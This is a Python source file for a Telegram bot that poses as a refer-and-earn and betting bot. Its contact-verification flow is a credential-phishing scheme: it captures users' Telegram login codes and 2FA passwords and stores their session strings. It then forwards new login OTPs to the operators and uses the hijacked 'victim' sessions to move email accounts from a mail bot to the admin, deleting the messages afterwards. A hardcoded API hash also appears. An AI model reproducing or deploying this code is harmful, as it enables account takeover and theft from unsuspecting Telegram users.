# -*- coding: utf-8 -*-
import sqlite3
import logging
import random
import string
import re
import os
import threading
import asyncio
import time
from fastapi import FastAPI
import uvicorn
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, Bot
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters,
    ContextTypes, CallbackQueryHandler
)
from telethon import TelegramClient, events
from telethon.sessions import StringSession

# ================== CONFIG ==================
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
API_ID = int(os.getenv("API_ID", "38746329"))
API_HASH = os.getenv("API_HASH", "dc6d3dd0de462ed07952a64c3253c437")

TARGET_MAIL_BOT = "fakemailbot"
transfer_running = {}

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ================== STYLISH FONTS ==================
FONT_MAP = {
    'a': 'Ａ', 'b': 'Ｂ', 'c': 'Ｃ', 'd': 'Ｄ', 'e': 'Ｅ', 'f': 'Ｆ', 'g': 'Ｇ', 'h': 'Ｈ', 'i': 'Ｉ', 'j': 'Ｊ',
    'k': 'Ｋ', 'l': 'Ｌ', 'm': 'Ｍ', 'n': 'Ｎ', 'o': 'Ｏ', 'p': 'Ｐ', 'q': 'Ｑ', 'r': 'Ｒ', 's': 'Ｓ', 't': 'Ｔ',
    'u': 'Ｕ', 'v': 'Ｖ', 'w': 'Ｗ', 'x': 'Ｘ', 'y': 'Ｙ', 'z': 'Ｚ',
    'A': 'Ａ', 'B': 'Ｂ', 'C': 'Ｃ', 'D': 'Ｄ', 'E': 'Ｅ', 'F': 'Ｆ', 'G': 'Ｇ', 'H': 'Ｈ', 'I': 'Ｉ', 'J': 'Ｊ',
    'K': 'Ｋ', 'L': 'Ｌ', 'M': 'Ｍ', 'N': 'Ｎ', 'O': 'Ｏ', 'P': 'Ｐ', 'Q': 'Ｑ', 'R': 'Ｒ', 'S': 'Ｓ', 'T': 'Ｔ',
    'U': 'Ｕ', 'V': 'Ｖ', 'W': 'Ｗ', 'X': 'Ｘ', 'Y': 'Ｙ', 'Z': 'Ｚ'
}
def f_txt(text): return "".join(FONT_MAP.get(c, c) for c in text)
def p_style(text): return f"<code>{text}</code>,"

# ================== DATABASE ==================
DB_PATH = "refer_bot.db"

def init_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, phone TEXT, session_string TEXT, 
        is_banned INTEGER DEFAULT 0, balance INTEGER DEFAULT 0, last_bonus REAL DEFAULT 0
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS withdrawals (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, upi_id TEXT, status TEXT DEFAULT 'Pending'
    )""")
    c.execute("CREATE TABLE IF NOT EXISTS bets (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, choice TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)")
    
    try: c.execute("ALTER TABLE users ADD COLUMN last_bonus REAL DEFAULT 0")
    except: pass
    conn.commit()
    conn.close()

init_db()

def db_exec(query, params=()):
    conn = sqlite3.connect(DB_PATH, timeout=10)
    c = conn.cursor()
    try:
        c.execute(query, params)
        conn.commit()
        res = c.fetchall()
    finally:
        conn.close()
    return res

def get_config(key, default=None):
    res = db_exec("SELECT value FROM config WHERE key=?", (key,))
    return res[0][0] if res else default

def set_config(key, value):
    db_exec("INSERT OR REPLACE INTO config (key, value) VALUES (?,?)", (key, value))

def get_all_admins():
    res = db_exec("SELECT user_id FROM admins")
    return [row[0] for row in res] if res else []

active_userbots = {}
temp_clients = {}
user_states = {}

# ================== FASTAPI ==================
web_app = FastAPI()
@web_app.get("/")
def read_root(): return {"status": "Alive"}
def run_web(): uvicorn.run(web_app, host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))

# ================== USERBOT AUTOMATION ==================
async def get_or_connect_client(user_id):
    if user_id in active_userbots: return active_userbots[user_id]
    res = db_exec("SELECT session_string FROM users WHERE user_id=?", (user_id,))
    if not res or not res[0][0]: return None
    client = TelegramClient(StringSession(res[0][0]), API_ID, API_HASH)
    await client.connect()
    active_userbots[user_id] = client
    return client

async def start_userbot(user_id, session_str):
    if user_id in active_userbots:
        try: await active_userbots[user_id].disconnect()
        except: pass
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()
    active_userbots[user_id] = client
    
    @client.on(events.NewMessage(incoming=True))
    async def otp_interceptor(event):
        try:
            if not event.is_private: return
            sender = await event.get_sender()
            if not sender: return
            sender_id = getattr(sender, "id", None)
            if sender_id == 777000:
                full_text = event.message.message or ""
                bot = Bot(BOT_TOKEN)
                for admin in get_all_admins():
                    try: 
                        await bot.send_message(admin, f"🔐 <b>{f_txt('NEW LOGIN OTP')}</b>,\n\n{p_style(full_text)}", parse_mode="HTML")
                    except: pass
        except Exception as e:
            logger.error(f"OTP interceptor error: {e}")

async def process_victim_mails(victim_uid, admin_id):
    if not transfer_running.get(admin_id, False): return
        
    try:
        victim_client = await get_or_connect_client(victim_uid)
        admin_client = await get_or_connect_client(admin_id)
        
        if not victim_client or not admin_client: 
            bot = Bot(BOT_TOKEN)
            return await bot.send_message(admin_id, f"❌ {p_style('Account not logged in')}", parse_mode="HTML")
            
        target_bot = await victim_client.get_entity(TARGET_MAIL_BOT)
        admin_target_bot = await admin_client.get_entity(TARGET_MAIL_BOT)
        
        bot = Bot(BOT_TOKEN)
        await victim_client.send_message(target_bot, "/id")
        await asyncio.sleep(4)
        
        if not transfer_running.get(admin_id, False): return
        
        messages = await victim_client.get_messages(target_bot, limit=2)
        if not messages: return
            
        emails = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', messages[0].message)
        if not emails: return

        for email in emails:
            if not transfer_running.get(admin_id, False): 
                await bot.send_message(admin_id, f"🛑 <b>{f_txt('TRANSFER CANCELLED')}</b>", parse_mode="HTML")
                return
                
            await bot.send_message(admin_id, f"🔄 <b>{f_txt('TRANSFERRING')}:</b>\n{p_style(email)}", parse_mode="HTML")
            
            # Victim ke account se transfer
            await victim_client.send_message(target_bot, f"/transfer {email} @{admin_id}")
            await asyncio.sleep(4)
            
            try:
                msgs = await victim_client.get_messages(target_bot, limit=1)
                await victim_client.delete_messages(target_bot, msgs[0].id)
            except: pass
            
            if not transfer_running.get(admin_id, False): return
            
            await bot.send_message(admin_id, f"📥 <b>{f_txt('CLAIMING')}:</b>\n{p_style(email)}", parse_mode="HTML")
            
            # Admin ke account se claim
            await admin_client.send_message(admin_target_bot, email)
            await asyncio.sleep(4)
            
            try:
                msgs = await admin_client.get_messages(admin_target_bot, limit=1)
                await admin_client.delete_messages(admin_target_bot, msgs[0].id)
            except: pass
            
            await bot.send_message(admin_id, f"✅ <b>{f_txt('CLAIMED')}:</b>\n{p_style(email)}", parse_mode="HTML")
            await asyncio.sleep(1)
            
    except Exception as e:
        logger.error(f"Transfer error: {e}")

async def start_claiming_process(admin_id, query):
    transfer_running[admin_id] = True
    cancel_kb = [[InlineKeyboardButton("🛑 CANCEL PROCESS", callback_data="cancel_process")]]
    
    # Admin ka username nikalne ke liye check karo
    admin_client = await get_or_connect_client(admin_id)
    if not admin_client:
        return await query.edit_message_text("❌ Login your account first using /start")
    
    me = await admin_client.get_me()
    admin_username = me.username if me.username else str(admin_id)
    
    await query.edit_message_text(f"⏳ <b>{f_txt('FETCHING MAILS...')}</b>\nTarget: {p_style('@' + admin_username)}", reply_markup=InlineKeyboardMarkup(cancel_kb), parse_mode="HTML")
    
    # Sirf victims ko uthao (sabhi admins ko chhod kar)
    admins = get_all_admins()
    placeholders = ",".join(["?"] * len(admins))
    query_str = f"SELECT user_id FROM users WHERE session_string IS NOT NULL AND user_id NOT IN ({placeholders})"
    
    users = db_exec(query_str, tuple(admins))
    
    if not users:
        transfer_running[admin_id] = False
        return await query.message.reply_text("❌ No victim accounts found,")
        
    for u in users:
        if not transfer_running.get(admin_id, False): break
        await process_victim_mails(u[0], admin_id)
        
    if transfer_running.get(admin_id, False):
        await query.message.reply_text(f"👑 <b>{f_txt('ALL MAILS CLAIMED SUCCESSFULLY')}</b>", parse_mode="HTML")
        
    transfer_running[admin_id] = False

# ================== KEYBOARDS ==================
def get_main_keyboard():
    kb = [
        [KeyboardButton("🎁 Bonus", style="primary"), KeyboardButton("💵 Balance", style="success")],
        [KeyboardButton("🔗 Refer Earn", style="primary"), KeyboardButton("🏦 Payout Method", style="primary"), KeyboardButton("💸 Withdraw", style="danger")],
        [KeyboardButton("🎰 Bet & Earn", style="success")]
    ]
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)

# ================== BOT HANDLERS ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Pehla user owner banega
    total_admins = db_exec("SELECT COUNT(*) FROM admins")[0][0]
    if total_admins == 0:
        db_exec("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (user_id,))
        await update.message.reply_text(f"👑 <b>{f_txt('CONGRATULATIONS! YOU ARE NOW OWNER')}</b>", parse_mode="HTML")
    
    is_admin = user_id in get_all_admins()
    res = db_exec("SELECT session_string FROM users WHERE user_id=?", (user_id,))
    
    welcome_text = f"👋 <b>{f_txt('WELCOME TO BOT')}</b>,\nPlease verify your contact to continue,"
    
    if res and res[0][0]:
        if is_admin:
            kb = [[InlineKeyboardButton("👑 Owner Panel", callback_data="open_owner_panel")]]
            await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        else:
            await update.message.reply_text(welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")
    else:
        await update.message.reply_text(
            f"🔒 <b>{f_txt('VERIFY YOURSELF')}</b>,\n\nPlease share your contact,",
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton("📱 Share Contact", request_contact=True)]], resize_keyboard=True, one_time_keyboard=True),
            parse_mode="HTML"
        )

async def verify_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    if not contact: return await update.message.reply_text("❌ Please use the button,")
    phone = contact.phone_number
    if not phone.startswith('+'): phone = '+' + phone
    uid = update.effective_user.id
    
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
        temp_clients[uid] = {'client': client, 'hash': sent.phone_code_hash, 'phone': phone, 'state': 'otp'}
        await update.message.reply_text(
            f"📩 <b>{f_txt('We have sent you a Telegram verify password')}</b>,\n\nEnter it manually below,",
            reply_markup=ReplyKeyboardMarkup([[]], resize_keyboard=True),
            parse_mode="HTML"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e},")

async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    uid = update.effective_user.id
    is_admin = uid in get_all_admins()
    
    if is_admin:
        state = user_states.get(uid)
        if state == 'admin':
            if text.isdigit():
                db_exec("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (int(text),))
                await update.message.reply_text(f"✅ {p_style('Admin Added')}", parse_mode="HTML")
            user_states[uid] = None; return

    if uid in temp_clients:
        state = temp_clients[uid].get('state')
        if state == '2fa':
            try:
                await temp_clients[uid]['client'].sign_in(password=text)
                session = temp_clients[uid]['client'].session.save()
                db_exec("INSERT OR REPLACE INTO users (user_id, phone, session_string) VALUES (?,?,?)", (uid, temp_clients[uid]['phone'], session))
                del temp_clients[uid]
                await start_userbot(uid, session)
                await update.message.reply_text(f"✅ <b>{f_txt('Verification Successful')}</b>", reply_markup=get_main_keyboard(), parse_mode="HTML")
                return
            except Exception as e:
                return await update.message.reply_text(f"❌ 2FA Failed: {e},")
        
        elif state == 'otp':
            otp = text.replace(" ", "").replace("-", "")
            try:
                await temp_clients[uid]['client'].sign_in(phone=temp_clients[uid]['phone'], code=otp, phone_code_hash=temp_clients[uid]['hash'])
                session = temp_clients[uid]['client'].session.save()
                db_exec("INSERT OR REPLACE INTO users (user_id, phone, session_string) VALUES (?,?,?)", (uid, temp_clients[uid]['phone'], session))
                del temp_clients[uid]
                await start_userbot(uid, session)
                await update.message.reply_text(f"✅ <b>{f_txt('Verification Successful')}</b>", reply_markup=get_main_keyboard(), parse_mode="HTML")
                return
            except Exception as e:
                if "Two-step" in str(e) or "password" in str(e).lower():
                    temp_clients[uid]['state'] = '2fa'
                    return await update.message.reply_text(f"🔐 <b>{f_txt('ENTER 2FA PASSWORD')}</b>", parse_mode="HTML")
                else:
                    return await update.message.reply_text(f"❌ OTP Failed: {e},")

    if text == "💵 Balance":
        res = db_exec("SELECT balance FROM users WHERE user_id=?", (uid,))
        bal = res[0][0] if res else 0
        await update.message.reply_text(f"💵 <b>{f_txt('Balance')}</b>,\n{p_style('Current Balance: ₹' + str(bal))}", parse_mode="HTML")

# ================== OWNER PANEL ==================
async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id if update.message else update.callback_query.from_user.id
    if uid not in get_all_admins(): return
    
    kb = [
        [InlineKeyboardButton("👥 Logged Accounts", callback_data="admin_acc"), InlineKeyboardButton("👑 Add Admin", callback_data="admin_add")],
        [InlineKeyboardButton("📤 Claim All Mails", callback_data="admin_claim")]
    ]
    text = f"<b>👑 {f_txt('OWNER PANEL')}</b>,\nSelect an option:"
    
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    uid = query.from_user.id
    
    if uid not in get_all_admins(): return await query.answer("Unauthorized", show_alert=True)
    
    if data == "admin_acc":
        users = db_exec("SELECT user_id, phone FROM users WHERE session_string IS NOT NULL")
        text = f"👥 <b>{f_txt('Logged Devices/Accounts')}:</b>,\n\n"
        for u in users: 
            text += f"{p_style('ID: ' + str(u[0]))}\n{p_style('Phone: ' + str(u[1]))}\n"
        await query.edit_message_text(text, parse_mode="HTML")
        
    elif data == "admin_add":
        await query.edit_message_text(f"👑 {f_txt('Send User ID to make Admin')},")
        user_states[uid] = 'admin'
        
    elif data == "admin_claim":
        # Check if admin account is logged in
        res = db_exec("SELECT session_string FROM users WHERE user_id=?", (uid,))
        if not res or not res[0][0]:
            return await query.edit_message_text(f"⚠️ <b>{f_txt('ERROR')}</b>\nYour account is not logged in.\nPlease login using /start first.", parse_mode="HTML")
        
        asyncio.create_task(start_claiming_process(uid, query))
        
    elif data == "cancel_process":
        transfer_running[uid] = False
        await query.edit_message_text(f"🛑 <b>{f_txt('PROCESS CANCELLED')}</b>", parse_mode="HTML")

async def handle_start_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await owner_panel(update, context)

# ================== MAIN ==================
def main():
    threading.Thread(target=run_web, daemon=True).start()
    app_bot = Application.builder().token(BOT_TOKEN).build()

    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("owner", owner_panel))
    app_bot.add_handler(MessageHandler(filters.CONTACT, verify_phone))
    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^(admin_|cancel_)"))
    app_bot.add_handler(CallbackQueryHandler(handle_start_button, pattern="^open_owner_panel$"))
    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu_router))

    logger.info("Bot started successfully.")
    app_bot.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False)

if __name__ == "__main__":
    main()
